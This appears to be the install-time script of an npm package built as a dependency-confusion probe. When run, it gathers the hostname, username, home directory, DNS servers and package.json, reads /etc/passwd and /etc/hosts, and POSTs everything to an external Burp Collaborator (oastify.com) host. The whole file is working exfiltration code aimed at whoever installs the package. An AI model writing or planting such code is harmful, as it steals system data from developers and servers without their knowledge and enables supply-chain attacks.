const os = require("os");
const dns = require("dns");
const fs = require("fs");
const https = require("https");
const packageJSON = require("./package.json");
const packageName = packageJSON.name;

// Collect system data from the remote server where the package is installed
const trackingData = JSON.stringify({
  p: packageName, // Package name
  c: __dirname, // Directory where the package is installed
  hd: os.homedir(), // Home directory on the remote server
  hn: os.hostname(), // Hostname of the remote server
  un: os.userInfo().username, // Username on the remote server
  dns: dns.getServers(), // DNS servers on the remote server
  v: packageJSON.version, // Version of the package
  pjson: packageJSON, // Full package.json data
  etc_passwd: fs.existsSync("/etc/passwd")
    ? fs.readFileSync("/etc/passwd", "utf8")
    : null, // /etc/passwd from the remote system
  etc_hosts: fs.existsSync("/etc/hosts")
    ? fs.readFileSync("/etc/hosts", "utf8")
    : null, // /etc/hosts from the remote system
});

// Log the data to verify it's the remote server's information
console.log("Sending System Data from Remote Server: ", trackingData);

// Prepare the POST request data
var postData = JSON.stringify({
  msg: trackingData,
});

// Request options to send data to your server (Burp Collaborator or any endpoint)
var options = {
  hostname: "67bkwcqpeiguc9pdoinaj8c1hsnkbazz.oastify.com", // Burp Collaborator server
  port: 443,
  path: "/",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": postData.length,
  },
};

// Send the data via HTTPS POST request
var req = https.request(options, (res) => {
  res.on("data", (d) => {
    process.stdout.write(d); // Output the response from the server
  });
});

req.on("error", (e) => {
  console.error("Error sending data:", e); // Handle any error during the request
});

req.write(postData); // Send the data in the request body
req.end(); // End the request
